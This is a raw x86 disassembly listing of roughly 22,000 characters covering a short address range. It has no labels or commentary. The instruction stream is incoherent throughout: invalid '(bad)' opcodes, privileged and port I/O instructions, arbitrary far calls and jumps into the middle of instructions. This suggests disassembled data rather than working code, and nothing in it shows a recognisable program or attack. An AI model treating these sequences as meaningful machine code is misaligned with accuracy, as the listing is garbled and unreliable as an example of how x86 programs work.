  41eea1:	call   0x81db:0x83c99dc7
  41eea8:	jl     0x41ee39
  41eeaa:	stc    
  41eeab:	jge    0x41ee74
  41eead:	cdq    
  41eeae:	ins    BYTE PTR es:[edi],dx
  41eeaf:	mov    ebp,0x69531f18
  41eeb4:	mov    bh,0x7e
  41eeb6:	mov    dh,0x4e
  41eeb8:	sub    edi,DWORD PTR ds:0xad8e9ef1
  41eebe:	mov    ds:0xfab8a79e,al
  41eec3:	hlt    
  41eec4:	dec    ebp
  41eec5:	and    dh,cl
  41eec7:	popa   
  41eec8:	mov    esp,ecx
  41eeca:	cmc    
  41eecb:	(bad)  
  41eecc:	lock shr DWORD PTR [esi],cl
  41eecf:	cmp    BYTE PTR [eax],dh
  41eed1:	xchg   ebp,eax
  41eed2:	sbb    cl,BYTE PTR [eax+0x1]
  41eed5:	(bad)  
  41eed6:	jmp    0x41ef3b
  41eed8:	(bad)  
  41eed9:	mov    gs,WORD PTR [eax+eax*8-0x39353ee9]
  41eee0:	rcl    DWORD PTR [eax-0x8a7c79d],0xb3
  41eee7:	mov    esp,DWORD PTR [ebp-0x5a9899db]
  41eeed:	pushf  
  41eeee:	retf   0x8078
  41eef1:	inc    esi
  41eef2:	mov    ah,0x6e
  41eef4:	jle    0x41ef16
  41eef6:	int3   
  41eef7:	sub    dl,BYTE PTR [ecx-0x742f3781]
  41eefd:	(bad)  
  41eeff:	loop   0x41eeb5
  41ef01:	sahf   
  41ef02:	mov    WORD PTR ds:0xf880ed49,?
  41ef08:	enter  0xedb8,0xdd
  41ef0c:	xchg   DWORD PTR [eax+eax*2],esi
  41ef0f:	fnstenv [edi-0x2b]
  41ef12:	call   0xe6477b94
  41ef17:	lahf   
  41ef18:	aaa    
  41ef19:	fisubr WORD PTR [ecx+0x6d]
  41ef1c:	int    0x7a
  41ef1e:	sbb    ebp,DWORD PTR [ebx]
  41ef20:	inc    eax
  41ef21:	mov    edi,0xebe46a1c
  41ef26:	ss dec si
  41ef29:	fld    QWORD PTR [eax]
  41ef2b:	dec    esi
  41ef2c:	(bad)  
  41ef2d:	fsub   st(1),st
  41ef2f:	cli    
  41ef30:	es push ecx
  41ef32:	cmp    eax,0xb7c858eb
  41ef37:	and    eax,0x417be8c8
  41ef3c:	push   esp
  41ef3d:	xchg   esi,eax
  41ef3e:	popf   
  41ef3f:	push   edx
  41ef40:	dec    eax
  41ef41:	mov    edi,0xa3f8d12e
  41ef46:	in     eax,0x37
  41ef48:	push   0x2c
  41ef4a:	mov    ebx,0xf588912c
  41ef4f:	push   ss
  41ef50:	and    DWORD PTR [ebx],ebx
  41ef52:	sti    
  41ef53:	add    eax,0x208d56d3
  41ef58:	mov    BYTE PTR [ebp-0x49],ah
  41ef5b:	jecxz  0x41ef5f
  41ef5d:	sbb    eax,0xcaf4bf40
  41ef62:	mov    al,ds:0x1b15015e
  41ef67:	shl    BYTE PTR [ecx+0x4d],cl
  41ef6a:	ror    DWORD PTR [eax],1
  41ef6c:	rcr    esi,cl
  41ef6e:	sub    ecx,DWORD PTR [edx+ecx*4]
  41ef71:	or     esi,DWORD PTR [eax+0x74]
  41ef74:	mov    eax,ds:0x67578f53
  41ef79:	fwait
  41ef7a:	inc    esi
  41ef7b:	rcr    DWORD PTR [ebp-0x52],0xd1
  41ef7f:	shr    ch,0xbd
  41ef82:	or     ebp,ecx
  41ef84:	loop   0x41ef24
  41ef86:	mov    ah,0x8f
  41ef88:	push   ds
  41ef89:	loopne 0x41ef64
  41ef8b:	mov    ch,0xb0
  41ef8d:	call   FWORD PTR [ebp-0x713fe218]
  41ef93:	and    DWORD PTR es:[eax+0x3f],esp
  41ef97:	mov    ah,0x49
  41ef99:	loope  0x41ef4f
  41ef9b:	jbe    0x41ef62
  41ef9d:	repnz push ds
  41ef9f:	xchg   edi,eax
  41efa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efa1:	sbb    ah,dh
  41efa3:	retf   
  41efa4:	dec    esi
  41efa5:	mov    ch,0xda
  41efa7:	enter  0x5824,0x11
  41efab:	cwde   
  41efac:	xchg   ecx,eax
  41efad:	and    DWORD PTR [esi-0x20acb70],edi
  41efb3:	mov    bl,BYTE PTR [edx-0x50]
  41efb6:	shl    ebp,1
  41efb8:	bound  eax,QWORD PTR [ebp-0x7e]
  41efbb:	lahf   
  41efbc:	cli    
  41efbd:	jae    0x41eff9
  41efbf:	in     eax,dx
  41efc0:	rol    BYTE PTR [edi+0x56],0xdd
  41efc4:	sahf   
  41efc5:	ds rol ch,1
  41efc8:	xchg   ebx,eax
  41efc9:	jae    0x41ef82
  41efcb:	aas    
  41efcc:	retf   
  41efcd:	pusha  
  41efce:	in     al,dx
  41efcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efd0:	jae    0x41efe4
  41efd2:	add    bh,ch
  41efd4:	leave  
  41efd5:	shl    BYTE PTR [ebx-0x2030e7d3],cl
  41efdb:	daa    
  41efdc:	out    dx,eax
  41efdd:	loop   0x41efc9
  41efdf:	pushf  
  41efe0:	repnz out dx,al
  41efe2:	ja     0x41ef8c
  41efe4:	cmp    esi,DWORD PTR [eax-0x53]
  41efe7:	test   DWORD PTR [ebp+0x77],0x7ae2a321
  41efee:	leave  
  41efef:	sbb    DWORD PTR [eax+0x6c],ecx
  41eff2:	ds in  eax,dx
  41eff4:	jns    0x41effd
  41eff6:	mov    edi,0x285b5273
  41effb:	sahf   
  41effc:	mov    ebx,0x8cfa9ecc
  41f001:	mov    edi,0x903c8609
  41f006:	sub    ch,BYTE PTR [edi]
  41f008:	je     0x41efa6
  41f00a:	(bad)  
  41f00b:	fidiv  WORD PTR [edi+0x9]
  41f00e:	nop
  41f00f:	inc    esi
  41f010:	stc    
  41f011:	add    edi,DWORD PTR ds:0xf9f9bc9e
  41f017:	(bad)  
  41f018:	leave  
  41f019:	or     al,0x45
  41f01b:	(bad)  
  41f01d:	dec    ecx
  41f01e:	cmp    DWORD PTR [esi+0x94c8f40],0xf49136be
  41f028:	add    eax,0x9dfcbdb0
  41f02d:	mov    esi,0x5789862d
  41f032:	das    
  41f033:	shl    BYTE PTR [edi+0x295a365e],0x61
  41f03a:	cmc    
  41f03b:	dec    ecx
  41f03c:	rol    DWORD PTR [ebx],1
  41f03e:	mov    DWORD PTR [esi-0x23c5a8e0],esi
  41f044:	add    dl,BYTE PTR [ebp+0x3a646ee5]
  41f04a:	inc    edi
  41f04b:	retf   0x1b19
  41f04e:	xor    esi,esi
  41f050:	shr    BYTE PTR [esi-0x5],1
  41f053:	sub    DWORD PTR [edi+0x4d],eax
  41f056:	jo     0x41f00e
  41f058:	pop    eax
  41f059:	push   0x9f079d3e
  41f05e:	dec    edi
  41f05f:	xor    eax,0xe7bab10d
  41f064:	leave  
  41f065:	(bad)  
  41f067:	cmp    ch,BYTE PTR [esi+0x14]
  41f06a:	mov    eax,fs
  41f06c:	push   cs
  41f06d:	popa   
  41f06e:	ror    DWORD PTR [eax-0x65],cl
  41f071:	mov    al,ds:0xad0af9c9
  41f076:	inc    esi
  41f077:	or     bl,ch
  41f079:	dec    DWORD PTR ds:0x1e972ea5
  41f07f:	dec    eax
  41f080:	div    BYTE PTR [edx-0x3b]
  41f083:	mov    dl,0x36
  41f085:	nop
  41f086:	retf   0xcd10
  41f089:	push   ecx
  41f08a:	mov    eax,0xb1b82488
  41f08f:	sub    edi,edx
  41f091:	ja     0x41f0a9
  41f093:	pop    ds
  41f094:	sbb    esi,esp
  41f096:	mov    al,0x2
  41f098:	test   BYTE PTR [eax-0x37],bl
  41f09b:	xor    al,0x1
  41f09d:	add    al,0x51
  41f09f:	dec    ebx
  41f0a0:	mov    eax,0xc65b98b1
  41f0a5:	mov    bh,0xf5
  41f0a7:	adc    ah,BYTE PTR [ebx]
  41f0a9:	fist   DWORD PTR [esi]
  41f0ab:	dec    edx
  41f0ac:	adc    BYTE PTR [ecx+0x0],dh
  41f0af:	cwde   
  41f0b0:	xor    BYTE PTR [ebx],bh
  41f0b2:	adc    DWORD PTR [ecx+0x72],eax
  41f0b5:	inc    edi
  41f0b6:	hlt    
  41f0b7:	cmp    edx,DWORD PTR [esp+edx*2]
  41f0ba:	mov    ds,WORD PTR [edi+0x15]
  41f0bd:	mov    ds:0x2eefa1b6,eax
  41f0c2:	outs   dx,BYTE PTR ds:[esi]
  41f0c3:	xor    eax,ecx
  41f0c5:	iret   
  41f0c6:	in     al,dx
  41f0c7:	xor    DWORD PTR [edx-0x4c],esp
  41f0ca:	or     DWORD PTR [ecx+edx*2-0x4f],ebp
  41f0ce:	ret    
  41f0cf:	adc    BYTE PTR [edx+eiz*1+0x7467fa15],0xd3
  41f0d7:	mov    eax,0xc3071c21
  41f0dc:	add    BYTE PTR [esi+0x64],0xa1
  41f0e0:	loopne 0x41f068
  41f0e2:	pop    edi
  41f0e3:	push   0xb4f8b2de
  41f0e8:	push   0x35
  41f0ea:	xchg   edx,eax
  41f0eb:	mov    ecx,gs
  41f0ed:	adc    ecx,DWORD PTR [esi+esi*4-0x3c436fe7]
  41f0f4:	popa   
  41f0f5:	xchg   BYTE PTR [eax+0x5a5cc221],ah
  41f0fb:	aas    
  41f0fc:	sub    DWORD PTR [ebx],ecx
  41f0fe:	mov    bh,BYTE PTR [esi+0x26]
  41f101:	(bad)  
  41f102:	(bad)  
  41f103:	test   BYTE PTR [edi-0x5429b0f],ah
  41f109:	out    dx,al
  41f10a:	cwde   
  41f10b:	cwde   
  41f10c:	sbb    BYTE PTR [edi+0x65b86c88],bl
  41f112:	push   es
  41f113:	mov    ch,0xe6
  41f115:	push   ebp
  41f116:	(bad)  
  41f117:	pop    ebx
  41f118:	imul   edi,edi,0xffffffea
  41f11b:	push   es
  41f11c:	stc    
  41f11d:	dec    edx
  41f11e:	leave  
  41f11f:	push   cs
  41f120:	cdq    
  41f121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f122:	(bad)  
  41f123:	and    eax,0xbe092f4b
  41f128:	int    0xb5
  41f12a:	into   
  41f12b:	jno    0x41f17d
  41f12d:	clc    
  41f12e:	cmc    
  41f12f:	pop    ebp
  41f130:	mov    esp,0x21c29420
  41f135:	repz mov edx,0x7ad4da54
  41f13b:	sar    cl,cl
  41f13d:	test   al,0xdf
  41f13f:	cmp    dh,BYTE PTR [ecx+0x64]
  41f142:	or     ebp,ebp
  41f144:	sbb    BYTE PTR [ebx+0x6c],cl
  41f147:	shl    BYTE PTR fs:[ebx],0xc6
  41f14b:	sub    eax,0xbdb31ee6
  41f150:	shl    edi,1
  41f152:	or     ah,BYTE PTR [edx]
  41f154:	and    ebx,ebp
  41f156:	fcom   DWORD PTR [eax+ebp*8]
  41f159:	das    
  41f15a:	inc    esi
  41f15b:	sbb    bh,BYTE PTR [ebx]
  41f15d:	cs jp  0x41f185
  41f160:	loopne 0x41f0fd
  41f162:	(bad)  [esi]
  41f164:	add    bl,dh
  41f166:	push   edx
  41f167:	inc    edx
  41f168:	mov    ecx,0x6d3ac362
  41f16d:	xchg   esp,eax
  41f16e:	inc    edi
  41f16f:	jno    0x41f1a8
  41f171:	jp     0x41f1cd
  41f173:	call   0xc22:0x6d0bfb16
  41f17a:	jp     0x41f1f0
  41f17c:	inc    edi
  41f17d:	cmp    dl,dl
  41f17f:	mov    bh,0xa7
  41f181:	sar    BYTE PTR [eax-0x5e],0x8e
  41f185:	je     0x41f16b
  41f187:	cmp    eax,0xa991bbb1
  41f18c:	cmp    eax,0xe91d9ecb
  41f191:	outs   dx,DWORD PTR ds:[esi]
  41f192:	nop
  41f193:	outs   dx,BYTE PTR ds:[esi]
  41f195:	or     eax,0xcb64e02a
  41f19a:	nop
  41f19b:	jmp    FWORD PTR [ecx]
  41f19d:	or     al,0x81
  41f19f:	mov    bh,0xf3
  41f1a1:	push   ds
  41f1a2:	inc    edi
  41f1a3:	or     al,0x79
  41f1a5:	sbb    al,0x8
  41f1a7:	enter  0x90e5,0x51
  41f1ab:	and    al,BYTE PTR [edx-0x74]
  41f1ae:	test   edx,ebx
  41f1b0:	fcom   QWORD PTR [ecx]
  41f1b2:	pusha  
  41f1b3:	jecxz  0x41f162
  41f1b5:	cdq    
  41f1b6:	and    BYTE PTR [esi-0x7f],0xa1
  41f1ba:	xchg   esi,eax
  41f1bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1bc:	out    0x1,eax
  41f1be:	aad    0xbd
  41f1c0:	sub    bh,ch
  41f1c2:	inc    eax
  41f1c3:	adc    DWORD PTR [ecx*2-0x33ef7c86],esi
  41f1ca:	push   0x5b870df
  41f1cf:	pusha  
  41f1d0:	lahf   
  41f1d1:	adc    eax,0x27028bf1
  41f1d6:	push   cs
  41f1d7:	stc    
  41f1d8:	cmc    
  41f1d9:	sbb    al,0x78
  41f1db:	add    BYTE PTR [esp+ecx*1],ah
  41f1de:	loope  0x41f1a3
  41f1e0:	std    
  41f1e1:	pop    edi
  41f1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1e3:	mov    ds,cx
  41f1e6:	mov    eax,ds:0x7541dc59
  41f1eb:	retf   0xf7d
  41f1ee:	fmul   DWORD PTR [ecx+ebp*8+0x23]
  41f1f2:	push   edx
  41f1f3:	xchg   edx,eax
  41f1f4:	push   DWORD PTR [ebx-0x14660bc5]
  41f1fa:	invd   
  41f1fc:	pop    ds
  41f1fd:	cs das 
  41f1ff:	jae    0x41f1f8
  41f201:	iret   
  41f202:	leave  
  41f203:	jp     0x41f208
  41f205:	call   0x396a:0xb2f7c397
  41f20c:	mov    edi,0xcd49c1d3
  41f211:	fwait
  41f212:	das    
  41f213:	fucom  st(5)
  41f215:	and    eax,DWORD PTR [eax+0x73]
  41f218:	lock push ebx
  41f21a:	imul   edi
  41f21c:	mov    al,0x5c
  41f21e:	xchg   BYTE PTR [eax],bl
  41f220:	add    BYTE PTR [esi-0xb],0x96
  41f224:	cli    
  41f225:	sbb    BYTE PTR [esi+eiz*2-0x2a],al
  41f229:	test   BYTE PTR [edi-0x4c55fe7b],bl
  41f22f:	pop    ebp
  41f230:	push   cs
  41f231:	sub    BYTE PTR [edx-0x706f294a],ah
  41f237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f238:	mov    dh,0x79
  41f23a:	mov    WORD PTR ss:[ebx-0x3f6f1c96],?
  41f241:	xor    BYTE PTR [esi+0x5c],bl
  41f244:	sbb    eax,0xc2f9f4c7
  41f249:	ins    BYTE PTR es:[edi],dx
  41f24a:	aaa    
  41f24b:	xchg   edx,eax
  41f24c:	cli    
  41f24d:	sbb    eax,0x3150c76e
  41f252:	stc    
  41f253:	retf   
  41f254:	cmc    
  41f255:	mov    eax,ds:0xd4cc8f12
  41f25a:	xchg   edx,eax
  41f25b:	nop
  41f25c:	ret    0xaa0e
  41f25f:	bound  ebp,QWORD PTR [eax-0x667c16d2]
  41f265:	sub    al,0xdf
  41f267:	in     al,0x54
  41f269:	sub    eax,0x6141178f
  41f26e:	out    0xe6,al
  41f270:	dec    ecx
  41f271:	dec    eax
  41f272:	push   ss
  41f273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f274:	pusha  
  41f275:	jg     0x41f22f
  41f277:	and    edx,DWORD PTR ds:0x63dfd32f
  41f27d:	div    BYTE PTR [ebp-0x2e]
  41f280:	xchg   DWORD PTR [ecx-0x5bbfd4b4],ecx
  41f286:	adc    BYTE PTR [ecx+0x65],0xa8
  41f28a:	pop    esi
  41f28b:	imul   edx,DWORD PTR [ebx-0x7e],0x54d0bcb0
  41f292:	dec    esi
  41f293:	fwait
  41f294:	inc    ebp
  41f295:	xor    dh,BYTE PTR [edi]
  41f297:	xchg   ecx,eax
  41f298:	xor    ebx,ebp
  41f29a:	retf   
  41f29b:	test   BYTE PTR [eax+0x68c247f6],cl
  41f2a1:	jecxz  0x41f2a5
  41f2a3:	mov    cl,0x3a
  41f2a5:	add    eax,0x71f229a3
  41f2aa:	sar    eax,0xd0
  41f2ad:	xor    DWORD PTR [eax],esi
  41f2af:	jmp    0x7822:0xa6e4ad8c
  41f2b6:	test   eax,0x435597f
  41f2bb:	pop    edx
  41f2bc:	lods   al,BYTE PTR ds:[esi]
  41f2bd:	jecxz  0x41f2a5
  41f2bf:	lahf   
  41f2c0:	xchg   edx,eax
  41f2c1:	and    dh,dh
  41f2c3:	data16 cmp ch,BYTE PTR [ebx]
  41f2c6:	repz pusha 
  41f2c8:	mov    ds:0x448fe351,eax
  41f2cd:	call   0x4cc7:0x182a64da
  41f2d4:	inc    ebp
  41f2d5:	fnsave [edi+0xd]
  41f2d8:	clc    
  41f2d9:	sbb    al,0x43
  41f2db:	add    al,0x78
  41f2dd:	repz (bad) 
  41f2df:	fisubr WORD PTR [eax-0x70]
  41f2e2:	jbe    0x41f26f
  41f2e4:	inc    di
  41f2e6:	xlat   BYTE PTR ds:[ebx]
  41f2e7:	ds mov esp,0x9cd54609
  41f2ed:	xlat   BYTE PTR ds:[ebx]
  41f2ee:	pop    esp
  41f2ef:	lea    ebp,[eax+esi*1-0x23aeac9c]
  41f2f6:	xchg   edi,eax
  41f2f7:	fs pop edi
  41f2f9:	(bad)
  41f2fd:	sub    dh,al
  41f2ff:	jg     0x41f350
  41f301:	xor    DWORD PTR [edx+0x6d9004ae],esp
  41f307:	in     eax,0x7c
  41f309:	stc    
  41f30a:	xor    DWORD PTR [eax+0x3f],0xb5777b04
  41f311:	jbe    0x41f336
  41f313:	pop    eax
  41f314:	mov    ds:0xd41712b5,eax
  41f319:	sbb    DWORD PTR [ebp+0x5f],edx
  41f31c:	iret   
  41f31d:	or     BYTE PTR [edx+0x4a],bl
  41f320:	outs   dx,BYTE PTR ds:[esi]
  41f321:	out    dx,al
  41f322:	pop    ebx
  41f323:	adc    BYTE PTR [ecx],0x40
  41f326:	out    0xae,al
  41f328:	inc    ecx
  41f329:	sbb    al,0xae
  41f32b:	dec    esi
  41f32c:	sbb    DWORD PTR [edi],edx
  41f32e:	popf   
  41f32f:	add    al,0xb3
  41f331:	xlat   BYTE PTR ds:[ebx]
  41f332:	add    esp,DWORD PTR gs:[edx+ebp*4-0x4f]
  41f337:	mov    ?,WORD PTR [eax-0x2a]
  41f33a:	pop    ebx
  41f33b:	jns    0x41f338
  41f33d:	sahf   
  41f33e:	mov    ds:0xa11715ce,eax
  41f343:	jp     0x41f30d
  41f345:	xlat   BYTE PTR ds:[ebx]
  41f346:	jmp    0x41f2f4
  41f348:	imul   eax,ecx,0x73c041ec
  41f34e:	sbb    al,0xe4
  41f350:	dec    esp
  41f351:	jne    0x41f3c3
  41f353:	sub    DWORD PTR ds:0x269a480d,edi
  41f359:	out    dx,eax
  41f35a:	jmp    0x41f308
  41f35c:	(bad)  
  41f35e:	pusha  
  41f35f:	int3   
  41f360:	int3   
  41f361:	in     al,dx
  41f362:	inc    eax
  41f363:	into   
  41f364:	out    dx,eax
  41f365:	hlt    
  41f366:	es pop ebx
  41f368:	out    dx,al
  41f369:	dec    ebp
  41f36a:	lea    ebp,[eax-0x70]
  41f36d:	dec    esp
  41f36e:	mov    al,ds:0xecef5e54
  41f373:	inc    ecx
  41f374:	leave  
  41f375:	idiv   DWORD PTR [edi-0x53]
  41f378:	mov    ecx,0x856e8e06
  41f37d:	or     bh,ch
  41f37f:	addr16 dec eax
  41f381:	enter  0x23ac,0xac
  41f385:	sti    
  41f386:	or     BYTE PTR [edx-0x67668eb5],al
  41f38c:	rol    ebx,1
  41f38e:	repz (bad) 
  41f390:	jmp    0x41f325
  41f392:	pop    ds
  41f393:	(bad)  
  41f394:	push   edx
  41f395:	call   0x89f3f99c
  41f39a:	scas   al,BYTE PTR es:[edi]
  41f39b:	sar    DWORD PTR [ebp-0x18],1
  41f39e:	push   edx
  41f39f:	in     eax,dx
  41f3a0:	and    bl,0x5a
  41f3a3:	jmp    0xed5:0x6a20a340
  41f3aa:	inc    ecx
  41f3ab:	and    BYTE PTR [esi],al
  41f3ad:	and    eax,0x3d3ac5e
  41f3b2:	dec    edx
  41f3b3:	sbb    edi,DWORD PTR [edi+0x50]
  41f3b6:	xchg   ecx,eax
  41f3b7:	mov    edi,0x83f2ff29
  41f3bc:	mov    ebx,0xd9168271
  41f3c1:	pop    es
  41f3c2:	lahf   
  41f3c3:	test   BYTE PTR [edx],bh
  41f3c5:	dec    eax
  41f3c6:	cmp    al,0x6a
  41f3c8:	mov    ebp,0xaf0e42bb
  41f3cd:	adc    ebp,DWORD PTR [esi]
  41f3cf:	aaa    
  41f3d0:	mov    ebp,0x62504252
  41f3d5:	add    ch,al
  41f3d7:	and    ah,BYTE PTR [esi+ebp*4+0x18]
  41f3db:	dec    edx
  41f3dc:	mov    esp,DWORD PTR [eax+0x22]
  41f3df:	adc    BYTE PTR [ebx-0x55bb6ed],bl
  41f3e5:	or     eax,0x21c35035
  41f3ea:	daa    
  41f3eb:	loope  0x41f459
  41f3ed:	pop    esp
  41f3ee:	mov    ds:0x59260f36,eax
  41f3f3:	xchg   ecx,eax
  41f3f4:	dec    esp
  41f3f5:	sub    BYTE PTR [ebp-0x537c1485],bh
  41f3fb:	bound  ecx,QWORD PTR [ebx+esi*2-0x35]
  41f3ff:	cs xchg esp,eax
  41f401:	push   es
  41f402:	mov    ecx,0x3c2e53b1
  41f407:	ins    BYTE PTR es:[edi],dx
  41f408:	gs cmp al,0x8c
  41f40b:	jae    0x41f3c3
  41f40d:	push   0x6b206caa
  41f412:	sub    DWORD PTR [edx+eax*1+0x3b],ebx
  41f416:	jne    0x41f3ba
  41f418:	adc    eax,0xd15e99f6
  41f41d:	jbe    0x41f460
  41f41f:	sub    BYTE PTR [edx],ch
  41f421:	out    dx,eax
  41f422:	pop    es
  41f423:	adc    ecx,DWORD PTR [edx-0x2cebccff]
  41f429:	and    al,0x31
  41f42b:	sub    BYTE PTR [ebx+0x625bafdc],0x9c
  41f432:	aas    
  41f433:	loope  0x41f43d
  41f435:	xchg   edx,eax
  41f436:	dec    ecx
  41f437:	mov    al,ds:0xf46f753c
  41f43c:	jb     0x41f48a
  41f43e:	xor    eax,0xed728929
  41f443:	cmp    BYTE PTR [esp+ecx*8-0x37dc6e2a],ah
  41f44a:	aad    0x37
  41f44c:	sbb    DWORD PTR [eax+0x63],esi
  41f44f:	and    BYTE PTR [esi],bh
  41f451:	mov    edx,0xf319dfdc
  41f456:	inc    esi
  41f457:	mov    ebp,DWORD PTR [eax+eiz*8]
  41f45a:	xchg   esi,eax
  41f45b:	mov    al,0x3f
  41f45d:	add    eax,0x13a45655
  41f462:	loop   0x41f42a
  41f464:	daa    
  41f465:	loop   0x41f441
  41f467:	out    dx,al
  41f468:	lods   eax,DWORD PTR ds:[esi]
  41f469:	mov    edx,0x5b02afdf
  41f46e:	add    al,0xea
  41f470:	inc    ebp
  41f471:	adc    ch,cl
  41f473:	mov    ecx,0x491d0e99
  41f478:	into   
  41f479:	mov    eax,ebp
  41f47b:	xchg   edx,eax
  41f47c:	jge    0x41f40b
  41f47e:	adc    esp,DWORD PTR [eax]
  41f480:	dec    eax
  41f481:	repnz das 
  41f483:	mov    esp,DWORD PTR [ebp+0x27]
  41f486:	sub    eax,0xf9b0049a
  41f48b:	out    dx,al
  41f48c:	jmp    0xb8550ebe
  41f491:	cdq    
  41f492:	dec    esi
  41f493:	add    DWORD PTR [ecx+0x1f],eax
  41f496:	cmp    DWORD PTR [ebp-0x4bb2cbbd],ebx
  41f49c:	pop    es
  41f49d:	mov    ?,WORD PTR ds:0x244dc5aa
  41f4a3:	adc    al,0xb4
  41f4a5:	adc    ebx,DWORD PTR [ebx-0x33b976de]
  41f4ab:	sub    al,0x2e
  41f4ad:	pop    ss
  41f4ae:	and    ecx,ebx
  41f4b0:	fnstsw WORD PTR [edi*4-0x1c9ce910]
  41f4b7:	int3   
  41f4b8:	rol    BYTE PTR [ebx],1
  41f4ba:	push   0xf0a63069
  41f4bf:	xchg   ecx,eax
  41f4c0:	call   0x608b41aa
  41f4c5:	fcom   QWORD PTR [edx+ecx*1-0x9fef6cf]
  41f4cc:	adc    DWORD PTR [edi+0x2e],esp
  41f4cf:	pop    ebp
  41f4d0:	adc    al,0xa7
  41f4d2:	sbb    ebx,0xffffffef
  41f4d5:	rol    esi,0x6
  41f4d8:	jne    0x41f51b
  41f4da:	stc    
  41f4db:	repnz rcl BYTE PTR [ecx],1
  41f4de:	sub    DWORD PTR [esi-0x162a4f53],0xbd719b49
  41f4e8:	xor    DWORD PTR [edi],esp
  41f4ea:	dec    esp
  41f4eb:	push   cs
  41f4ec:	movd   DWORD PTR [esi],mm5
  41f4ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4f0:	add    al,0x6
  41f4f2:	fdivp  st(3),st
  41f4f4:	xlat   BYTE PTR ds:[ebx]
  41f4f5:	cmp    BYTE PTR [edx],ah
  41f4f7:	fwait
  41f4f8:	dec    ecx
  41f4f9:	push   esp
  41f4fa:	jl     0x41f566
  41f4fc:	scas   eax,DWORD PTR es:[edi]
  41f4fd:	pop    ecx
  41f4fe:	mov    dl,0x1d
  41f500:	fld    st(4)
  41f502:	sbb    al,0xc1
  41f504:	pusha  
  41f505:	pop    edi
  41f506:	xor    edi,DWORD PTR [esp+0x7b71a81c]
  41f50d:	jne    0x41f4f1
  41f50f:	xchg   ebp,eax
  41f510:	lahf   
  41f511:	push   0xf45a0efa
  41f516:	jl     0x41f555
  41f518:	push   eax
  41f519:	repnz imul esp,DWORD PTR [ecx+0x53],0xffffffa7
  41f51e:	jbe    0x41f4ff
  41f520:	cmp    BYTE PTR [edi+ebx*1-0x4b],0x59
  41f525:	push   esi
  41f526:	push   0xf9b15d4a
  41f52b:	push   0x7f
  41f52d:	fdivr  st,st(2)
  41f52f:	add    esp,edi
  41f531:	std    
  41f532:	pop    edx
  41f534:	sbb    BYTE PTR cs:[edx-0x7b6de197],bh
  41f53b:	out    0x1b,eax
  41f53d:	test   BYTE PTR [eax+0x477504a7],dh
  41f543:	ds dec ebp
  41f545:	pop    ebx
  41f546:	sub    edx,eax
  41f548:	sbb    BYTE PTR [eax-0x42d9b806],0xe1
  41f54f:	sub    dh,ah
  41f551:	inc    eax
  41f552:	mov    BYTE PTR [edi],bl
  41f554:	mov    edi,0x63da97ff
  41f559:	mov    bh,0x17
  41f55b:	lds    eax,FWORD PTR [edx+0x79de802b]
  41f561:	arpl   di,si
  41f563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f564:	test   al,0x83
  41f566:	aas    
  41f567:	jg     0x41f5c7
  41f569:	idiv   edi
  41f56b:	xor    ebp,edx
  41f56d:	imul   edi,DWORD PTR [edi],0x78
  41f570:	scas   al,BYTE PTR es:[edi]
  41f571:	clc    
  41f572:	jne    0x41f5ed
  41f574:	mov    esp,0x5cae16b7
  41f579:	adc    al,0x24
  41f57b:	sahf   
  41f57c:	scas   al,BYTE PTR es:[edi]
  41f57d:	mov    eax,0x9c1a07d8
  41f582:	dec    edi
  41f583:	mov    ecx,0xf4e9869f
  41f588:	mov    eax,0xa125874
  41f58d:	cmp    al,0xeb
  41f58f:	add    esp,ecx
  41f591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f592:	fistp  WORD PTR [ebx+0x2a]
  41f595:	adc    ah,BYTE PTR [edi]
  41f597:	and    edx,ebx
  41f599:	mov    cl,0x14
  41f59b:	mov    DWORD PTR [eax+0x8],esp
  41f59e:	xor    eax,0x2da52dfe
  41f5a3:	aam    0x7c
  41f5a5:	or     al,ah
  41f5a7:	das    
  41f5a8:	cmc    
  41f5a9:	dec    eax
  41f5aa:	addr16 call 0x37381035
  41f5b0:	retf   0xb241
  41f5b3:	loop   0x41f565
  41f5b5:	cmp    eax,0x3636d98b
  41f5ba:	xor    ah,0x69
  41f5bd:	popa   
  41f5be:	ins    BYTE PTR es:[edi],dx
  41f5bf:	inc    esp
  41f5c0:	push   0xa11bde76
  41f5c5:	cmp    BYTE PTR [edi+ebx*8-0x729ef656],ah
  41f5cc:	jne    0x41f643
  41f5ce:	pop    ebp
  41f5cf:	inc    ecx
  41f5d0:	shl    BYTE PTR [eax-0x9259a13],cl
  41f5d6:	xlat   BYTE PTR ds:[ebx]
  41f5d7:	xchg   BYTE PTR [eax-0x36c60bb5],cl
  41f5dd:	ja     0x41f5ea
  41f5df:	pop    eax
  41f5e0:	iret   
  41f5e1:	inc    esi
  41f5e2:	ret    0x2773
  41f5e5:	aam    0x8e
  41f5e7:	or     DWORD PTR [esi+0x7442fc6b],edx
  41f5ed:	stos   DWORD PTR es:[edi],eax
  41f5ee:	xchg   ebp,eax
  41f5ef:	and    DWORD PTR [eax],edx
  41f5f1:	imul   ebx,DWORD PTR [edi-0x4c],0x6
  41f5f5:	push   ss
  41f5f6:	cmc    
  41f5f7:	(bad)  
  41f5f8:	jnp    0x41f5de
  41f5fa:	mov    edx,0x89c2674a
  41f5ff:	outs   dx,BYTE PTR ds:[esi]
  41f600:	jae    0x41f59c
  41f602:	in     al,0xe7
  41f604:	iret   
  41f605:	xchg   edi,eax
  41f606:	xor    al,dl
  41f608:	jne    0x41f5e5
  41f60a:	push   0xde00067d
  41f60f:	cwde   
  41f610:	lahf   
  41f611:	or     ch,al
  41f613:	aad    0x25
  41f615:	call   0x8c45:0xc84298af
  41f61c:	mov    edx,0xb8436cac
  41f621:	or     dl,dl
  41f623:	ror    BYTE PTR [ebx-0x305b2164],cl
  41f629:	dec    esi
  41f62a:	adc    al,0x21
  41f62c:	cmp    BYTE PTR [edi+0x57d0eded],0xc7
  41f633:	mov    dh,0xa2
  41f635:	mov    al,ds:0x6e19c40f
  41f63a:	sbb    al,0x93
  41f63c:	retf   
